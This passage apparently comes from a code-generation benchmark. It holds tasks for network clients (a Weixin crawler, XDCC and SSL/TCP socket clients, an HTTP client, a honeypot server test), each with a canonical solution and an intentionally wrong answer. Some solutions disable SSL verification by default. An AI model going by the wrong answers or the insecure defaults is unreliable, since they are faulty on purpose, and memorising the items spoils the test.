+ b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00\\x00\\x00' + b'\\x00\\x00"
  },
  {
    "Task_id": 34,
    "Instruction": "Task Description: Create a function to crawl content from Weixin Official Account Platform (mp.weixin.qq.com) URLs using HTTP requests with proper error handling and logging.\n\nFunction Description: The function mp_crawler takes a URL and a logger object as input, validates the URL, makes an HTTPS request to the Weixin Official Account Platform, and returns a status code along with response data (empty in case of errors). It includes URL validation, HTTP request handling with timeout, and proper error logging.\n\nInput:\n- url: str - The target URL to crawl (must be from mp.weixin.qq.com domain)\n- logger: logging.Logger - Logger object for recording warnings and errors\n\nOutput:\n- Tuple[int, dict] - Returns a tuple containing:\n  - First element: int status code (-5 for invalid URL, -7 for request failure, or HTTP status code for success)\n  - Second element: dict containing response data (empty dict in case of errors)",
    "Canonical_solution": "import httpx\nfrom bs4 import BeautifulSoup\nfrom datetime import datetime\nimport re\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'}\n\ndef mp_crawler(url: str, logger) -> (int, dict):\n    if not url.startswith('https://mp.weixin.qq.com') and not url.startswith('http://mp.weixin.qq.com'):\n        logger.warning(f'{url} is not a mp url, you should not use this function')\n        return -5, {}\n\n    url = url.replace(\"http://\", \"https://\", 1)\n\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport logging\nimport re\nimport requests\nfrom urllib.parse import urlparse\n\ndef mp_crawler(url, logger):\n    # Validate URL\n    if not re.match(r'^https?://mp\\.weixin\\.qq\\.com', url):\n        logger.warning(f'Invalid URL: {url}')\n        return -5, {}\n\n    # Make HTTPS request\n    try:\n        response = requests.get(url, timeout=10)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        logger.error(f'Request failed: {e}')\n        return -7, {}\n\n    # Return status code and response data\n    return response.status_code, response.json()\n```"
  },
  {
    "Task_id": 346,
    "Instruction": "Task Description: Implement a TCP client class for handling XDCC file downloads with progress tracking, speed calculation, and resumable download capabilities.\n\nClass Description: XDCCRequest is a class that manages file downloads over DCC (Direct Client-to-Client) protocol using TCP sockets. It provides functionality for establishing connections, downloading files with progress tracking, handling resumable downloads, and managing download speed calculations.\n\nAttributes:\n- proxies: dict - Proxy configuration for the connection\n- bucket: object - Rate limiting bucket for download speed control\n- fh: file object - File handle for writing downloaded data\n- dccsock: socket - TCP socket for DCC connection\n- filesize: int - Total size of the file being downloaded\n- received: int - Number of bytes received so far\n- speeds: list - List of recent download speeds (last three measurements)\n- sleep: float - Dynamic sleep interval for rate control\n- last_recv_size: int - Size of last received data chunk\n- send_64bits_ack: bool - Flag for using 64-bit ACK packets\n- abort: bool - Flag to indicate download abortion\n- status_notify: function - Callback for progress updates\n\nMethods:\n- create_socket() -> socket - Creates and returns a new TCP socket\n- _write_func(buf: bytes) -> None - Writes buffer to file with rate control\n- _send_ack() -> None - Sends acknowledgement of received bytes to server\n- download(ip: str, port: int, filename: str, status_notify: function=None, resume: function=None) -> str - Main download method\n- abort_downloads() -> None - Sets abort flag to stop current download\n- update_progress() -> None - Triggers progress notification callback\n- close() -> None - Cleanup method (currently empty)\n\nProperties:\n- size: int - Returns total file size\n- arrived: int - Returns bytes received so far\n- speed: int - Returns average download speed\n- percent: int - Returns download progress percentage",
    "Canonical_solution": "import errno\nimport os\nimport select\nimport socket\nimport struct\nimport time\n\nclass XDCCRequest:\n    def __init__(self, bucket=None, options={}):\n        self.proxies = options.get(\"proxies\", {})\n        self.bucket = bucket\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = [0, 0, 0]\n        self.sleep = 0.000\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        return sock\n\n    def _write_func(self, buf):\n        size = len(buf)\n        self.received += size\n        self.fh.write(buf)\n\n        if self.bucket:\n            time.sleep(self.bucket.consumed(size))\n        else:\n            if size < self.last_recv_size:\n                self.sleep += 0.002\n            else:\n                self.sleep *= 0.7\n            self.last_recv_size = size\n            time.sleep(self.sleep)\n\n    def _send_ack(self):\n        try:\n            self.dccsock.send(\n                struct.pack(\"!Q\" if self.send_64bits_ack else \"!I\", self.received)\n            )\n        except socket.error:\n            pass\n\n    def download(self, ip, port, filename, status_notify=None, resume=None):\n        self.status_notify = status_notify\n        self.send_64bits_ack = not self.filesize < 1 << 32\n        chunk_name = filename + \".chunk0\"\n\n        if resume and os.path.exists(chunk_name):\n            self.fh = open(chunk_name, mode=\"ab\")\n            resume_position = self.fh.tell()\n            if not resume_position:\n                resume_position = os.stat(chunk_name).st_size\n            resume_position = resume(resume_position)\n            self.fh.truncate(resume_position)\n            self.received = resume_position\n        else:\n            self.fh = open(chunk_name, mode=\"wb\")\n\n        last_update = time.time()\n        num_recv_len = 0\n        self.dccsock = self.create_socket()\n        recv_list = [self.dccsock]\n        self.dccsock.connect((ip, port))\n        self.dccsock.setblocking(False)\n\n        while True:\n            if self.abort:\n                self.dccsock.close()\n                self.fh.close()\n                raise Abort\n\n            fdset = select.select(recv_list, [], [], 0.1)\n            if self.dccsock in fdset[0]:\n                try:\n                    data = self.dccsock.recv(16384)\n                except socket.error as exc:\n                    if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK):\n                        continue\n                    else:\n                        raise\n\n                data_len = len(data)\n                if data_len == 0 or self.received + data_len > self.filesize > 0:\n                    break\n\n                num_recv_len += data_len\n                self._write_func(data)\n                self._send_ack()\n\n            now = time.time()\n            timespan = now - last_update\n            if timespan > 1:\n                self.speeds[2] = self.speeds[1]\n                self.speeds[1] = self.speeds[0]\n                self.speeds[0] = num_recv_len // timespan\n                num_recv_len = 0\n                last_update = now\n                self.update_progress()\n\n        self.dccsock.close()\n        self.fh.close()\n        os.rename(chunk_name, filename)\n        return filename\n\n    def abort_downloads(self):\n        self.abort = True\n\n    def update_progress(self):\n        if self.status_notify:\n            self.status_notify({\"progress\": self.percent})\n\n    @property\n    def size(self):\n        return self.filesize\n\n    @property\n    def arrived(self):\n        return self.received\n\n    @property\n    def speed(self):\n        speeds = [x for x in self.speeds if x]\n        return sum(speeds) // len(speeds)\n\n    @property\n    def percent(self):\n        if not self.filesize:\n            return 0\n        return (self.received * 100) // self.filesize\n\n    def close(self):\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nclass XDCCRequest:\n    def __init__(self, proxies=None):\n        self.proxies = proxies\n        self.bucket = None\n        self.fh = None\n        self.dccsock = None\n        self.filesize = 0\n        self.received = 0\n        self.speeds = []\n        self.sleep = 0\n        self.last_recv_size = 0\n        self.send_64bits_ack = False\n        self.abort = False\n        self.status_notify = None\n\n    def create_socket(self) -> socket:\n        pass\n\n    def _write_func(self, buf: bytes) -> None:\n        pass\n\n    def _send_ack(self) -> None:\n        pass\n\n    def download(self, ip: str, port: int, filename: str, status_notify: function=None, resume: function=None) -> str:\n        pass\n\n    def abort_downloads(self) -> None:\n        pass\n\n    def update_progress(self) -> None:\n        pass\n\n    def close(self) -> None:\n        pass\n\n    @property\n    def size(self) -> int:\n        pass\n\n    @property\n    def arrived(self) -> int:\n        pass\n\n    @property\n    def speed(self) -> int:\n        pass\n\n    @property\n    def percent(self) -> int:\n        pass\n```"
  },
  {
    "Task_id": 348,
    "Instruction": "Task Description: Implement a secure TCP client using SSL/TLS for encrypted communication with a server. The client should establish a secure connection, send data, receive responses, and properly close the connection.\n\nFunction Description: The code consists of two functions:\n1. `ssl_client_connect` - Creates and returns an SSL-wrapped socket connected to the specified host and port, with certificate verification\n2. `ssl_client_communicate` - Sends a message through the secure socket, receives the response, and closes the connection\n\nInput:\n- For `ssl_client_connect`:\n  - host: str - The target server's hostname or IP address\n  - port: int - The target server's port number\n  - cert_file: str - Path to the CA certificate file for server verification\n\n- For `ssl_client_communicate`:\n  - ssl_socket: ssl.SSLSocket - The established SSL socket connection\n  - message: bytes - The data to send to the server\n\nOutput:\n- For `ssl_client_connect`: Returns an established SSL socket connection (ssl.SSLSocket)\n- For `ssl_client_communicate`: Returns the server's response as bytes",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\nimport ssl\n\ndef ssl_client_connect(host, port, cert_file):\n    s = socket(AF_INET, SOCK_STREAM)\n    ssl_s = ssl.wrap_socket(s,\n                           cert_reqs=ssl.CERT_REQUIRED,\n                           ca_certs=cert_file)\n    ssl_s.connect((host, port))\n    return ssl_s\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.send(message)\n    resp = ssl_socket.recv(8192)\n    ssl_socket.close()\n    return resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport ssl\nimport socket\n\ndef ssl_client_connect(host, port, cert_file):\n    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=cert_file)\n    with socket.create_connection((host, port)) as sock:\n        with context.wrap_socket(sock, server_hostname=host) as ssock:\n            return ssock\n\ndef ssl_client_communicate(ssl_socket, message):\n    ssl_socket.sendall(message)\n    response = ssl_socket.recv(4096)\n    ssl_socket.close()\n    return response\n```"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Python class that provides TCP socket functionality including connection establishment, data transmission, and SSL support for secure communication.\n\nClass Description: The SocketLibrary class encapsulates TCP socket operations with support for both regular and SSL-wrapped connections. It provides methods to establish connections, send/receive data, and gather connection information.\n\nAttributes: None (This is a utility class without persistent attributes)\n\nMethods:\n\nMethod1: create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]] - Creates and returns a TCP socket connection to the specified host and port. Attempts SSL connection first, falls back to regular TCP if SSL fails. Returns a tuple containing the socket object and SSL flag (True if SSL succeeded).\n\nMethod2: tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection to verify connectivity and returns connection details including peer information, service name, and SSL status without data transmission.\n\nMethod3: tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]] - Establishes a TCP connection, sends test data, receives response, and returns connection details including peer information, service name, response data, and SSL status.",
    "Canonical_solution": "import socket\nimport ssl\nfrom typing import Optional, Tuple, Dict, Any\n\nclass SocketLibrary:\n    def create_tcp_socket(self, host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n            ssl_flag = False\n        except ConnectionRefusedError:\n            return None\n\n        try:\n            socket_connection = ssl.wrap_socket(socket_connection)\n            ssl_flag = True\n        except Exception:\n            socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            socket_connection.settimeout(timeout)\n            socket_connection.connect((host, port))\n\n        return socket_connection, ssl_flag\n\n    def tcp_connect_only(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        socket_connection.close()\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(int(port)),\n            \"ssl_flag\": ssl_flag,\n        }\n\n    def tcp_connect_send_and_receive(self, host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        tcp_socket = self.create_tcp_socket(host, port, timeout)\n        if tcp_socket is None:\n            return None\n\n        socket_connection, ssl_flag = tcp_socket\n        peer_name = socket_connection.getpeername()\n        try:\n            socket_connection.send(b\"ABC\\x00\\r\\n\\r\\n\\r\\n\" * 10)\n            response = socket_connection.recv(1024 * 1024 * 10)\n            socket_connection.close()\n        except Exception:\n            try:\n                socket_connection.close()\n                response = b\"\"\n            except Exception:\n                response = b\"\"\n        return {\n            \"peer_name\": peer_name,\n            \"service\": socket.getservbyport(port),\n            \"response\": response.decode(errors=\"ignore\"),\n            \"ssl_flag\": ssl_flag,\n        }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nimport json\n\nclass SocketLibrary:\n    @staticmethod\n    def create_tcp_socket(host: str, port: int, timeout: float) -> Optional[Tuple[socket.socket, bool]]:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            ssl_sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1_2)\n            ssl_sock.settimeout(timeout)\n            ssl_sock.connect((host, port))\n            return ssl_sock, True\n        except Exception as e:\n            print(f\"SSL connection failed: {e}\")\n            try:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.settimeout(timeout)\n                sock.connect((host, port))\n                return sock, False\n            except Exception as e:\n                print(f\"TCP connection failed: {e}\")\n                return None, None\n\n    @staticmethod\n    def tcp_connect_only(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            peer_info = sock.getpeername()\n            service = socket.getservbyport(port)\n            ssl_status = False\n            return {\"peer_info\": peer_info, \"service\": service, \"ssl_status\": ssl_status}\n        except Exception as e:\n            print(f\"TCP connection failed: {e}\")\n            return None\n\n    @staticmethod\n    def tcp_connect_send_and_receive(host: str, port: int, timeout: float) -> Optional[Dict[str, Any]]:\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((host, port))\n            peer_info = sock.getpeername()\n            service = socket.getservbyport(port)\n            ssl_status = False\n            test_data = json.dumps({\"test\": \"data\"}).encode()\n            sock.sendall(test_data)\n            response = sock.recv(1024)\n            return {\"peer_info\": peer_info, \"service\": service, \"response\": response, \"ssl_status\": ssl_status}\n        except Exception as e:\n            print(f\"TCP connection failed: {e}\")\n            return None\n```"
  },
  {
    "Task_id": 35,
    "Instruction": "Task Description: Create a Python class that provides HTTP client functionality using both the `httpx` and `requests` libraries, with support for common HTTP methods, SSL verification control, and custom headers.\n\nClass Description: The `HTTPClient` class encapsulates HTTP request functionality, offering methods to perform GET requests and check API/web accessibility. It supports custom headers and SSL verification configuration.\n\nAttributes:\n\nheader: dict - Dictionary containing HTTP headers to be sent with requests (default includes User-Agent)\nverify: bool - Flag indicating whether to verify SSL certificates (default is False)\n\nMethods:\n\ntest_api_web: test_api_web(url: str) -> Optional[Tuple[str, str]] - Checks if a web API/URL is accessible and returns a tuple containing the page title and URL if successful, None otherwise\nget_request: get_request(url: str, params: dict = None) -> requests.Response - Sends a GET request using the requests library and returns the Response object\nclient_get: client_get(url: str) -> httpx.Response - Sends a GET request using httpx client and returns the Response object",
    "Canonical_solution": "import httpx\nimport requests\nfrom typing import Optional, Tuple\nfrom loguru import logger\n\nclass HTTPClient:\n    def __init__(self, headers: dict = None, verify_ssl: bool = False):\n        self.header = headers or {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36\"\n        }\n        self.verify = verify_ssl\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        \"\"\"Check if API web is accessible\n        :return: Tuple containing (title, url) if successful, None otherwise\n        \"\"\"\n        if url is None:\n            return None\n            \n        with httpx.Client(headers=self.header, verify=self.verify) as client:\n            try:\n                resp = client.get(url=url).text\n                title = re.findall('<title>(.*?)</title>', resp)\n                if title:\n                    logger.info(f\"{url} title:{title[0]}\")\n                    return (title[0], url)\n            except httpx.HTTPError as why:\n                logger.error(f\"{url} request error! {why}\")\n        return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        \"\"\"Send GET request using requests library\n        :return: Response object\n        \"\"\"\n        try:\n            return requests.get(\n                url,\n                headers=self.header,\n                params=params,\n                timeout=8,\n                verify=self.verify\n            )\n        except Exception as e:\n            logger.error(f\"GET request failed: {e}\")\n            raise\n\n    def client_get(self, url: str) -> httpx.Response:\n        \"\"\"Send GET request using httpx client\n        :return: Response object\n        \"\"\"\n        with httpx.Client(verify=self.verify) as client:\n            return client.get(url, headers=self.header)",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport requests\nimport httpx\nfrom typing import Optional, Tuple\n\nclass HTTPClient:\n    def __init__(self, header: dict = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\"}, verify: bool = False):\n        self.header = header\n        self.verify = verify\n\n    def test_api_web(self, url: str) -> Optional[Tuple[str, str]]:\n        try:\n            response = requests.get(url, headers=self.header, verify=self.verify)\n            if response.status_code == 200:\n                from bs4 import BeautifulSoup\n                soup = BeautifulSoup(response.text, 'html.parser')\n                title = soup.title.string\n                return (title, url)\n            else:\n                return None\n        except Exception as e:\n            return None\n\n    def get_request(self, url: str, params: dict = None) -> requests.Response:\n        return requests.get(url, headers=self.header, params=params, verify=self.verify)\n\n    def client_get(self, url: str) -> httpx.Response:\n        return httpx.get(url, headers=self.header, verify=self.verify)\n```"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Write a Python function that tests command responses from a Kamstrup management server by sending specific commands and verifying the responses against expected values.\n\nFunction Description: The function establishes a TCP connection to a Kamstrup management server, sends a help command and a specific packet command, then verifies if the responses match the expected values from a predefined response dictionary. The function returns True only if both responses match their expected values.\n\nInput:\n- packet_type: [str] - The key used to look up the expected response in the RESPONSES dictionary for the packet command.\n- help_msg_command: [bytes] - The byte string representing the help command to be sent to the server.\n- packet_msg_command: [bytes] - The byte string representing the packet command to be sent to the server.\n- kamstrup_management_server: [object] - An object containing the server's connection details, specifically the server port.\n\nOutput:\n- [bool] - Returns True if both the help command response and packet command response match their expected values in the RESPONSES dictionary, otherwise returns False.",
    "Canonical_solution": "from gevent import socket\nfrom conpot.tests.data.kamstrup_management_data import RESPONSES\n\ndef check_command_resp_help_message(\n    packet_type, help_msg_command, packet_msg_command, kamstrup_management_server\n):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((\"127.0.0.1\", kamstrup_management_server.server.server_port))\n    _ = s.recv(1024)  # receive the banner\n    s.sendall(help_msg_command)  # test the help command\n    help_data = s.recv(1024)\n    help_response = help_data == RESPONSES[\"H\"][packet_type]\n    s.sendall(packet_msg_command)\n    pkt_data = s.recv(1024)\n    packet_resp = pkt_data == RESPONSES[packet_type]\n    s.close()\n    return help_response and packet_resp",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\ndef test_kamstrup_management_server(packet_type, help_msg_command, packet_msg_command, kamstrup_management_server):\n    RESPONSES = {\n        'help': b'Kamstrup Management Server',\n        'packet': b'Packet response'\n    }\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n        sock.connect((kamstrup_management_server['ip'], kamstrup_management_server['port']))\n        sock.send(help_msg_command)\n        help_msg_response = sock.recv(1024)\n        sock.send(packet_msg_command)\n        packet_msg_response = sock.recv(1024)\n        return help_msg_response == RESPONSES['help'] and packet_msg_response == RESPONSES[packet_type]\n```"
  },
  {
    "Task_id": 353,
    "Instruction": "Task Description: Implement a TCP client function in Python that communicates with a server using sockets. The function should establish a connection, send a message, receive a response, and close the connection.\n\nFunction Description: The function `tcp_client_communication` creates a TCP socket, connects to a specified server, sends a message, receives a response, and then closes the connection. It uses IPv4 for the socket connection.\n\nInput:\n- `host` (str, optional): The IP address or hostname of the server. Defaults to 'localhost'.\n- `port` (int, optional): The port number on which the server is listening. Defaults to 16000.\n- `message` (bytes, optional): The message to be sent to the server. Defaults to b'Hello\\n'.\n\nOutput:\n- `response` (bytes): The data received from the server as a response.",
    "Canonical_solution": "from socket import socket, AF_INET, SOCK_STREAM\n\ndef tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    s = socket(AF_INET, SOCK_STREAM)\n    s.connect((host, port))\n    s.send(message)\n    response = s.recv(8192)\n    s.close()\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\n\ndef tcp_client_communication(host='localhost', port=16000, message=b'Hello\\n'):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(message)\n        response = s.recv(1024)\n    return response\n```"
  },
  {
    "Task_id": 356,
    "Instruction": "Task Description: Implement a TCP client class that communicates with a server to validate sessions using JSON-RPC protocol, handling connection management, data transmission, and response validation.\n\nClass Description: CaseTCP is a TCP client class that establishes and maintains a connection to a server, sends session validation requests in JSON-RPC format, and processes the server's responses with proper error handling and assertion checks.\n\nAttributes:\n- identity: int - A unique identifier for the client (defaults to process ID)\n- expected: bool - The expected validation result from the server\n- uri: str - The server IP address (default: '127.0.0.1')\n- port: int - The server port number (default: 8545)\n- sock: socket.socket - The TCP socket object for communication\n- payload: str - A random string payload for session validation\n\nMethods:\n- __init__(uri: str = '127.0.0.1', port: int = 8545, identity: int = os.getpid()) -> None - Initializes the client with server connection details and generates a random payload\n- __call__(**kwargs) -> int - Makes a combined send and receive call (takes optional a and b parameters)\n- send(*, a: 